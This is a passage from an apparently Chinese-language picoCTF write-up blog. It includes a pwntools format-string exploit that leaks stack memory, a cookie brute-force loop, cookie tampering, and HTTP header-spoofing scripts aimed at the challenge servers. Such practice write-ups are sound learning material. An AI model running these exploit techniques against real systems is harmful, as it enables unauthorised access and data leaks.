+</span></span></code></pre></td></tr></table></div></div><p>在 <code>buy_stonks</code> 函式裡的 <code>printf</code> 少惹格式化字符串的參數，這個叫做 <code>Uncontrolled format string</code> 格式化字串漏洞的樣子，如果偶們使用 <code>%x</code> 或 <code>%X$p</code> (<code>X</code> 為任意正整數)，可以把堆疊上的資料打印出來。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>char api_buf[FLAG_BUFFER];
+</span></span><span class=line><span class=cl>FILE *f = fopen(&#34;api&#34;,&#34;r&#34;);
+</span></span><span class=line><span class=cl>// ... 中間省略 ...
+</span></span><span class=line><span class=cl>fgets(api_buf, FLAG_BUFFER, f);
+</span></span></code></pre></td></tr></table></div></div><p>程式前面有把🏁 [api檔案] 讀到 <code>api_buf</code> 這個字串裡面，所以可以打出來😻 偶們先在 <code>terminal</code> 試試看🧑‍💻</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; nc mercury.picoctf.net 33411
+</span></span><span class=line><span class=cl>Welcome back to the trading app!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>What would you like to do?
+</span></span><span class=line><span class=cl>1) Buy some stonks!
+</span></span><span class=line><span class=cl>2) View my portfolio
+</span></span><span class=line><span class=cl>1
+</span></span><span class=line><span class=cl>Using patented AI algorithms to buy stonks
+</span></span><span class=line><span class=cl>Stonks chosen
+</span></span><span class=line><span class=cl>What is your API token?
+</span></span><span class=line><span class=cl>%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x 
+</span></span><span class=line><span class=cl>Buying stonks with token:
+</span></span><span class=line><span class=cl>919a3d0-804b000-80489c3-f7f02d80-ffffffff-1-9198160-f7f10110-f7f02dc7-0-9199180-1-919a3b0-919a3d0-6f636970-7b465443-306c5f49-345f7435
+</span></span><span class=line><span class=cl>Portfolio as of Sun Jun 20 10:23:09 UTC 2021
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>1 shares of FZH
+</span></span><span class=line><span class=cl>2 shares of P
+</span></span><span class=line><span class=cl>2 shares of E
+</span></span><span class=line><span class=cl>73 shares of ZX
+</span></span><span class=line><span class=cl>41 shares of PNBU
+</span></span><span class=line><span class=cl>1707 shares of TXUL
+</span></span><span class=line><span class=cl>77 shares of YMA
+</span></span><span class=line><span class=cl>Goodbye!
+</span></span></code></pre></td></tr></table></div></div><p>不過 <strong>%</strong> 出來的東西是16進位的資料然後有八位，不過偶不知到為隔膜是八位，因為書裡面的有十六位，不過如果要把這些數字轉成字串的話可以用 <code>pwntool</code> 裡面的 <code>p32()</code>，如果有十六位就用 <code>p64()</code> ，它還會幫忙把字串倒過來，好像是因為Linux是小頭端的關西，這裡有危機百科的<a class=link href=https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F target=_blank rel=noopener>大頭端和小頭端</a>。　</p><p>還有要注意的地方就是<code>pwntool</code> 的 <code>recvline</code> 回傳的資料是byte的型態所以要用<code>.decode()</code>才會變成字串ㄛ📫 <code>p32()</code>也是ㄛ🤭</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;mercury.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>33411</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;What would you like to do?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%x</span><span class=s2>-&#34;</span> <span class=o>*</span> <span class=mi>30</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;What is your API token?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntilS</span><span class=p>(</span><span class=s2>&#34;Buying stonks with token:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>out</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>d</span> <span class=ow>in</span> <span class=n>out</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=ne>int</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=n>res</span>
+</span></span><span class=line><span class=cl>    <span class=n>except</span> <span class=n>Exception</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>應該會有答案跑出來😲😲</p><hr><h2 id=get-ahead>🌺GET aHEAD</h2><ul><li>Category: Web Exploitation</li><li>Score: 20</li></ul><h3 id=description-8>💁Description</h3><p>Find the flag being held on this server to get ahead of the competition <a class=link href=http://mercury.picoctf.net:15931/ target=_blank rel=noopener>http://mercury.picoctf.net:15931/</a></p><h3 id=solution-8>🙆Solution</h3><p>先把網頁打開，然後它會長醬子🥺</p><div class=table-wrapper><table><thead><tr><th>兩個按鈕</th><th>HTML</th></tr></thead><tbody><tr><td><img src=https://i.imgur.com/qqo9NB7.png loading=lazy></td><td><img src=https://i.imgur.com/40ZfnfP.png loading=lazy></td></tr></tbody></table></div><p>可以看出來紅色的按紐是用 GET 方法，藍色的是用 POST ，然後偶就不會惹🤧　偶看惹 <a class=link href=https://ctftime.org/user/95909 target=_blank rel=noopener>rschauhan2199</a> 和 <a class=link href=https://ctftime.org/user/106830 target=_blank rel=noopener>abbas</a> 的Write🆙 原來題目 get aHEAD 的意思是<strong>用HEAD方法請求</strong>，可以用這些方法：</p><h4 id=curl>cURL</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -I  http://mercury.picoctf.net:53554/index.php
+</span></span></code></pre></td></tr></table></div></div><p>用 <code>curl</code> 這個工具加上 <code>-I</code> 的參數發一個 <code>HEAD</code> 請求。</p><h4 id=burpsuite>Burpsuite</h4><p>這個要先安裝，偶孤陋寡聞沒用過🤕 先去<a class=link href=https://portswigger.net/burp/communitydownload target=_blank rel=noopener>官網</a>下載來安裝。其實偶搞不清楚這個軟件要怎摸用na😭😭</p><p>還好有 <strong>rschauhan2199</strong> 大大做的<a class=link href=https://ctftime.org/writeup/26931 target=_blank rel=noopener>教學影片</a>🥰🥰可能第一次使用需要設定一些東C，接下來的步驟大guy是醬子：</p><p><img src=https://i.imgur.com/6LWvIlM.png loading=lazy></p><p>開一個 <code>Project</code> ，然後選 <code>Proxy</code> ⏭️ <code>Intercept</code> ， 確定第三個按鈕 <code>Intercept in on</code> 是藍藍的，然後按 <code>Open Browser</code> ，接下來會打開 Brupsuite 的神奇 Chromium😈</p><p><img src=https://i.imgur.com/0kdl7pT.png loading=lazy></p><p>然後就把網址貼過來↩ 接下來它應該會一直轉轉轉，偶們在回到 <code>Brupsuite</code> 🔙</p><p><img src=https://i.imgur.com/33XgyiC.png loading=lazy></p><p>可以看到請求ㄉ資訊，不過這個是可以修改的窩，修改完按 <code>Forward</code> 就會送粗惹喔～嘗試過藍色和紅色的按鈕之後可以發現它們的差別只有一個是 <code>GET</code> ♂️ 一個是 <code>POST</code> ♀️ 所以偶們在按一次按鈕，然後把文字匡裡的 <code>GET</code> 改成 <code>HEAD</code> ㄛ⛎</p><p><img src=https://i.imgur.com/4z94Svk.png loading=lazy></p><p>按下 <code>forward</code> 之後，可以到 <code>HTTP history</code> 的分頁看結果，應該是最後一個請求，在 <code>Response</code> 那裡應該會有答案ㄛ☯</p><p><img src=https://i.imgur.com/qch5cFw.png loading=lazy></p><p>也可以右鍵 <code>Send to Repeater</code> 然後在上面的 <code>Repeater</code> 分頁再做一次窩🔱</p><p><img src=https://i.imgur.com/m9hTH5X.png loading=lazy></p><p><img src=https://i.imgur.com/F5KTEWm.png loading=lazy></p><h4 id=python-requests>Python requests</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>r = requests.head(&#39;http://mercury.picoctf.net:15931/index.php&#39;)
+</span></span><span class=line><span class=cl>print(r.headers)
+</span></span></code></pre></td></tr></table></div></div><p>醬子也可以ㄛ😲😲</p><hr><h2 id=cookies>🍻Cookies</h2><ul><li>Category: Web Exploitation</li><li>Score: 40</li></ul><h3 id=description-9>💁Description</h3><p>Who doesn&rsquo;t love cookies? Try to figure out the best one. <a class=link href=http://mercury.picoctf.net:21485/ target=_blank rel=noopener>http://mercury.picoctf.net:21485/</a></p><h3 id=solution-9>🙆Solution</h3><p>先把網頁打開，然後它會長醬子🥺</p><p><img src=https://i.imgur.com/CdZHqry.png loading=lazy></p><p>挖結果偶又不會惹🥺　偶去看惹 <a class=link href=https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Web%20Exploitation/Cookies/Cookies.md target=_blank rel=noopener>vivian-dai</a> 大大的Write🆙 還有 <a class=link href="https://www.youtube.com/watch?v=dY1pGjacF8w" target=_blank rel=noopener>chrissypoo</a> 的影片。</p><p>這題如果偶們在輸入匡裡面輸入 <code>snickerdoodle</code> 會發現跑到這裡 :mage:</p><p><img src=https://i.imgur.com/EuNrKBF.png loading=lazy></p><p>偶們可以按 <code>f12</code> 之後在上面的分頁選 <code>Application</code> 再左邊的地方選 <code>Cookies</code></p><p><img src=https://i.imgur.com/2l3VfBq.png loading=lazy></p><p>可以看到它有使用一個叫做 <code>name</code> 的 <code>cookie</code> ，偶們如果把 <code>name</code> 的值從 $0$ 改成 $1$ ，再從新整理網頁，會發現跑到新的一頁惹🤭　所以偶寫一個小 <code>Python</code> 去讓它試🐍</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>import re
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for i in range(1, 10000):
+</span></span><span class=line><span class=cl>    r = requests.get(&#34;http://mercury.picoctf.net:21485/check&#34;,
+</span></span><span class=line><span class=cl>                     cookies={&#34;name&#34;: str(i)})
+</span></span><span class=line><span class=cl>    # Requests 請求可以帶 Cookies
+</span></span><span class=line><span class=cl>    if &#34;picoCTF&#34; in r.text:
+</span></span><span class=line><span class=cl>        print(&#34;Cookies: {name:&#34;, i, &#34;}\n&#34;)
+</span></span><span class=line><span class=cl>        for line in r.text.split():
+</span></span><span class=line><span class=cl>            if &#34;picoCTF&#34; in line:
+</span></span><span class=line><span class=cl>                print(line)
+</span></span><span class=line><span class=cl>        break
+</span></span></code></pre></td></tr></table></div></div><p>醬子應該就會有答案惹💩</p><hr><h2 id=insp3ct0r>👹Insp3ct0r</h2><ul><li>Category: Web Exploitation</li><li>Score: 50</li></ul><h3 id=description-10>💁Description</h3><p>Kishor Balan tipped us off that the following code may need inspection: <a class=link href=https://jupiter.challenges.picoctf.org/problem/44924/ target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/44924/</a> (link) or <a class=link href=http://jupiter.challenges.picoctf.org:44924 target=_blank rel=noopener>http://jupiter.challenges.picoctf.org:44924</a></p><h3 id=solution-10>🙆Solution</h3><p>那個因為偶覺得Web比較好玩💋 所以都先做魏ㄅ的題目🥂
+題目要偶們按右鍵檢查這個網頁的樣子🥶</p><p><img src=https://i.imgur.com/jGKdwNv.png loading=lazy></p><p>在 <code>HTML</code> 的部份我們可以看到 <code>flag</code> 的第一個部份，然後點上面 <code>Sources</code> 的分頁，可以看到 <code>Javascript</code> 和 <code>CSS</code> 的檔案，裡面有剩下的 <code>Flag</code> 。</p><p><img src=https://i.imgur.com/IE8kcCe.png loading=lazy></p><p>醬子應該就會有答案惹💩</p><hr><h2 id=scavenger-hunt>😼Scavenger Hunt</h2><ul><li>Category: Web Exploitation</li><li>Score: 50</li></ul><h3 id=description-11>💁Description</h3><p>There is some interesting information hidden around this site <a class=link href=http://mercury.picoctf.net:27393/ target=_blank rel=noopener>http://mercury.picoctf.net:27393/</a>. Can you find it?</p><h3 id=solution-11>🙆Solution</h3><p>題目要偶們按右鍵檢查這個網頁的樣子🥶</p><p><img src=https://i.imgur.com/JuwQhpF.png loading=lazy></p><p>在 <code>HTML</code> 的部份我們可以看到 <code>flag</code> 的第一個部份，然後點上面 <code>Sources</code> 的分頁，可以看到 <code>CSS</code> 的檔案，裡面有第二個部份的 <code>Flag</code> ，在 <code>JavaScript</code> 的檔案裡面它寫說 <code>/* How can I keep Google from indexing my website? */</code></p><p>偶有看<a class=link href=https://developers.google.com/search/docs/advanced/crawling/block-indexing target=_blank rel=noopener>這個網頁</a>，葛4它沒有用 <code>meta</code> 標籤，回應的 <code>http header</code> 偶也沒有看到 <code>X-Robots-Tag</code> 的東C，原來用 <code>robots.txt</code> 也可以，所以偶們試試看前往 <a class=link href=http://mercury.picoctf.net:27393/robots.txt target=_blank rel=noopener>http://mercury.picoctf.net:27393/robots.txt</a> 可以看到第三部份的 <code>flag</code> 。</p><p>接著它說 <code># I think this is an apache server... can you Access the next flag?</code> ，這個偶就想不粗來惹所以還是去看惹別人的 <a class=link href=https://github.com/xnomas/PicoCTF-2021-Writeups/blob/main/Scavenger_Hunt/README.md target=_blank rel=noopener><code>Write🆙</code></a>，這個倫寫的好仔細哈哈😙😙 ，<code>.htaccess</code> 是 <code>Apache</code> 用來設置權限規則的檔案，所以偶們訪問 <a class=link href=http://mercury.picoctf.net:27393/.htaccess target=_blank rel=noopener>http://mercury.picoctf.net:27393/.htaccess</a></p><p>接著它說 <code>I love making websites on my Mac, I can Store a lot of information there.</code> 偶就想到 <code>.DS_Store</code> ，偶只知道用 Mac 的倫都會有這個東C，它是做神摸的偶不珠到😂。</p><p>醬子應該就會有答案惹💩</p><p>看惹 <code>Dvd848</code> 的 <code>Write🆙</code> 才知道可以直接用 <code>dirsearch</code> 這個工具暴力去搜有神摸檔案😇 不過會花一些時間😈</p><p><img src=https://i.imgur.com/aBfrJKG.jpg loading=lazy></p><hr><h2 id=where-are-the-robots>🐾where are the robots</h2><ul><li>Category: Web Exploitation</li><li>Score: 100</li></ul><h3 id=description-12>💁Description</h3><p>Can you find the robots? <a class=link href=https://jupiter.challenges.picoctf.org/problem/60915/ target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/60915/</a> or <a class=link href=http://jupiter.challenges.picoctf.org:60915 target=_blank rel=noopener>http://jupiter.challenges.picoctf.org:60915</a></p><h3 id=solution-12>🙆Solution</h3><p>這個題目一樣是跟 <code>robots.txt</code> 有關西的東C，偶們試試看 <a class=link href=https://jupiter.challenges.picoctf.org/problem/60915/robots.txt target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/60915/robots.txt</a></p><p>結果發現它醬子寫：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>User-agent</span><span class=p>:</span><span class=w> </span>*<span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>Disallow</span><span class=p>:</span><span class=w> </span><span class=l>/8028f.html</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>偶們再試試看 <a class=link href=https://jupiter.challenges.picoctf.org/problem/60915/8028f.html target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/60915/8028f.html</a>
+醬子就有答案惹😇</p><hr><h2 id=logon>🦄logon</h2><ul><li>Category: Web Exploitation</li><li>Score: 100</li></ul><h3 id=description-13>💁Description</h3><p>The factory is hiding things from all of its users. Can you login as Joe and find what they&rsquo;ve been looking at? <a class=link href=https://jupiter.challenges.picoctf.org/problem/15796/ target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/15796/</a> or <a class=link href=http://jupiter.challenges.picoctf.org:15796 target=_blank rel=noopener>http://jupiter.challenges.picoctf.org:15796</a></p><h3 id=solution-13>🙆Solution</h3><p>偶先試試看隨便打一個帳號密碼是試試看，結果可以登入，不過神
+模都沒有，看它的 <code>HTML</code> 登入的地方長這樣🐻</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;div class=&#34;jumbotron&#34;&gt;
+</span></span><span class=line><span class=cl>    &lt;p class=&#34;lead&#34;&gt;&lt;/p&gt;
+</span></span><span class=line><span class=cl>    &lt;div class=&#34;login-form&#34;&gt;
+</span></span><span class=line><span class=cl>        &lt;form role=&#34;form&#34; action=&#34;/login&#34; method=&#34;post&#34;&gt;
+</span></span><span class=line><span class=cl>            &lt;div class=&#34;form-group&#34;&gt;
+</span></span><span class=line><span class=cl>                &lt;input type=&#34;text&#34; name=&#34;user&#34; id=&#34;email&#34; class=&#34;form-control input-lg&#34; placeholder=&#34;Username&#34;&gt;
+</span></span><span class=line><span class=cl>            &lt;/div&gt;
+</span></span><span class=line><span class=cl>            &lt;div class=&#34;form-group&#34;&gt;
+</span></span><span class=line><span class=cl>                &lt;input type=&#34;password&#34; name=&#34;password&#34; id=&#34;password&#34; class=&#34;form-control input-lg&#34; placeholder=&#34;Password&#34;&gt;
+</span></span><span class=line><span class=cl>            &lt;/div&gt;
+</span></span><span class=line><span class=cl>        &lt;/form&gt;
+</span></span><span class=line><span class=cl>    &lt;/div&gt;
+</span></span><span class=line><span class=cl>    &lt;div class=&#34;row&#34;&gt;
+</span></span><span class=line><span class=cl>        &lt;div class=&#34;col-xs-12 col-sm-12 col-md-12&#34;&gt;
+</span></span><span class=line><span class=cl>            &lt;input type=&#34;submit&#34; class=&#34;btn btn-lg btn-success btn-block&#34; value=&#34;Sign In&#34;&gt;
+</span></span><span class=line><span class=cl>        &lt;/div&gt;
+</span></span><span class=line><span class=cl>    &lt;/div&gt;
+</span></span><span class=line><span class=cl>&lt;/div&gt;
+</span></span></code></pre></td></tr></table></div></div><p>偶看不懂🐴🐴，臘個 <code>form</code> 也沒把 <code>submit</code> 包起來🐣 所以偶用 <code>wappalyzer</code> 看一下，感覺是 <code>Cookie</code> 在搞。</p><p><img src=https://i.imgur.com/mivrvsl.png loading=lazy></p><p>果然是它在搞事，可以按 <code>f12</code> 看一下 <code>Cookies</code> ，有一個叫做 <code>admin</code> 的，把它改成 <code>True</code> 之後重新整理就有惹🐻</p><p><img src=https://i.imgur.com/VD6GrE5.png loading=lazy></p><hr><h2 id=dont-use-client-side>🐻dont-use-client-side</h2><ul><li>Category: Web Exploitation</li><li>Score: 100</li></ul><h3 id=description-14>💁Description</h3><p>Can you break into this super secure portal? <a class=link href=https://jupiter.challenges.picoctf.org/problem/29835/ target=_blank rel=noopener>https://jupiter.challenges.picoctf.org/problem/29835/</a> or <a class=link href=http://jupiter.challenges.picoctf.org:29835 target=_blank rel=noopener>http://jupiter.challenges.picoctf.org:29835</a></p><h3 id=solution-14>🙆Solution</h3><p>偶先試試看隨便打一個密碼是試試看，它會縮不對，題目叫做不要相信客戶端，所以偶按右鍵檢查 <code>Verify</code> 的按鈕，發現它的 <code>onclick</code> 會觸發 <code>verify();</code> 函式，偶們到找到 <code>verify</code> 就可以看到答案惹🍑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function verify() {
+</span></span><span class=line><span class=cl>    checkpass = document.getElementById(&#34;pass&#34;).value;
+</span></span><span class=line><span class=cl>    split = 4;
+</span></span><span class=line><span class=cl>    if (checkpass.substring(0, split) == &#39;pico&#39;) {
+</span></span><span class=line><span class=cl>      if (checkpass.substring(split*6, split*7) == &#39;723c&#39;) {
+</span></span><span class=line><span class=cl>        if (checkpass.substring(split, split*2) == &#39;CTF{&#39;) {
+</span></span><span class=line><span class=cl>         if (checkpass.substring(split*4, split*5) == &#39;ts_p&#39;) {
+</span></span><span class=line><span class=cl>          if (checkpass.substring(split*3, split*4) == &#39;lien&#39;) {
+</span></span><span class=line><span class=cl>            if (checkpass.substring(split*5, split*6) == &#39;lz_7&#39;) {
+</span></span><span class=line><span class=cl>              if (checkpass.substring(split*2, split*3) == &#39;no_c&#39;) {
+</span></span><span class=line><span class=cl>                if (checkpass.substring(split*7, split*8) == &#39;e}&#39;) {
+</span></span><span class=line><span class=cl>                  alert(&#34;Password Verified&#34;)
+</span></span><span class=line><span class=cl>                  }
+</span></span><span class=line><span class=cl>                }
+</span></span><span class=line><span class=cl>              }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>          }
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>      }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    else {
+</span></span><span class=line><span class=cl>      alert(&#34;Incorrect password&#34;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=it-is-my-birthday>🥝It is my Birthday</h2><ul><li>Category: Web Exploitation</li><li>Score: 100</li></ul><h3 id=description-15>💁Description</h3><p>I sent out 2 invitations to all of my friends for my birthday! I&rsquo;ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn&rsquo;t believe how long it took me to find a collision. Anyway, see if you&rsquo;re invited by submitting 2 PDFs to my website. <a class=link href=http://mercury.picoctf.net:20277/ target=_blank rel=noopener>http://mercury.picoctf.net:20277/</a></p><h3 id=solution-15>🙆Solution</h3><p>題目落落長，英文不好看有夠久🍐，結果還是不會所以偶看惹 <a class=link href="https://www.youtube.com/watch?v=yn2MajG2dMg" target=_blank rel=noopener>Rahul Singh</a> 的影片，原來題目要偶們上傳兩個內容不同 <code>PDF</code> 的檔案，不過要有相同的 <code>md5</code> 哈西，偶們可以去 Google ：<code>md5 collision</code> ，不過偶不知道為隔膜自己把查到的字串加到檔案裡 <code>md5</code> 會不一樣，所以偶是完全依照 Rahul Singh 的方法na🍕，去 <a class=link href=https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value target=_blank rel=noopener>stackexchange.com</a> 下載下面圖片的那兩個檔案🦄</p><p><img src=https://i.imgur.com/iO9o1dI.png loading=lazy></p><p>然後在把副檔名改成 <code>.pdf</code> 上傳到題目那裡🆙，就會有答案惹🚀</p><hr><h2 id=who-are-you>🐣Who are you?</h2><ul><li>Category: Web Exploitation</li><li>Score: 100</li></ul><h3 id=description-16>💁Description</h3><p>Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn <a class=link href=http://mercury.picoctf.net:52362/ target=_blank rel=noopener>http://mercury.picoctf.net:52362/</a></p><h3 id=solution-16>🙆Solution</h3><p>這個題目有點壞👺，它的 <code>hint</code> 給惹 <code>http</code> 的文件，網頁寫說</p><blockquote><p>Only people who use the official PicoBrowser are allowed on this site!</p></blockquote><p>感覺又是需要改 <code>http headers</code> 的題目，偶是用 <code>Python</code> na，用 <code>BrupSuite</code> 也可以，先加一個 <code>User-Agent</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>headers = {&#34;User-Agent&#34;: &#34;PicoBrowser&#34;}
+</span></span><span class=line><span class=cl>r = requests.get(&#34;http://mercury.picoctf.net:52362/&#34;, headers=headers)
+</span></span><span class=line><span class=cl>print(r.text)
+</span></span></code></pre></td></tr></table></div></div><p>結果它又說它不相信其他地方來的人，之後還有很多要求😢 偶查惹很久 Google 特別是瑞典話的那個，感覺有兩種都符合他的說法🔕 最後的 <code>headers</code> 長這樣：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>headers = {&#34;User-Agent&#34;: &#34;PicoBrowser&#34;,
+</span></span><span class=line><span class=cl>           &#34;Referer&#34;: &#34;http://mercury.picoctf.net:52362/&#34;,
